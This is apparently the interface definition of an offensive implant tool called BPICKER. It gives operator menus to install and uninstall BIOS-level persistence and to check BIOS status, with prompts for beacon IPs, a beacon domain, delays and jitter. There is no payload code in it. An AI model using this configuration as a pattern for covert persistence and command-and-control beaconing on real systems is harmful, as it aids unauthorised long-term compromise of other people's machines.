File: BPICKER-3101.exe
Name: PersistenceInstaller 
Version: 0x03010001
Priority: 10
ID: 65815
chain: 0x10000000
activate: activateHandler
deactivate: deactivateHandler
Command: handler_bp
MUNGE
FINAL

<interface>
<menu>

    <menuItem>
        <itemText>Install Persistence</itemText>
        <queryList>
            <query>Beacon count:</query>
            <query>Primary beacon ip:</query>
            <query>Secondary beacon ip:</query>
            <query>Primary delay:</query>
            <query>Secondary delay:</query>
            <query>Session timeout (minutes):</query>
            <query>Beacon Domain (e.g. yahoo):</query>
            <query>Minimum time to add to beacon delay:</query>
            <query>Maximum time to add to beacon delay:</query>
        </queryList>
        <miniProg>
            <progName>BPICKER</progName>
            <handler>handler_bp</handler>
            <argList>
                <arg>--count</arg>
                <arg>--primary</arg>
                <arg>--secondary</arg>
                <arg>--pdelay</arg>
                <arg>--sdelay</arg>
                <arg>--stimeout</arg>
                <arg>--dom</arg>
                <arg>--minrand</arg>
                <arg>--maxrand</arg>
                <arg>--prompt</arg>
            </argList>
        </miniProg>
    </menuItem>

    <menuItem>
        <itemText>Uninstall Persistence</itemText>
        <miniProg>
            <progName>BPICKER</progName>
            <handler>handler_bp</handler>
            <argList>
                <arg>--uninstall</arg>
                <arg>--prompt</arg>
            </argList>
        </miniProg>
    </menuItem>

    <menuItem>
        <itemText>BIOS Status</itemText>
        <miniProg>
            <progName>BPICKER</progName>
            <handler>handler_bp</handler>
            <argList>
                <arg>--status</arg>
            </argList>
        </miniProg>
    </menuItem>

</menu>
</interface>
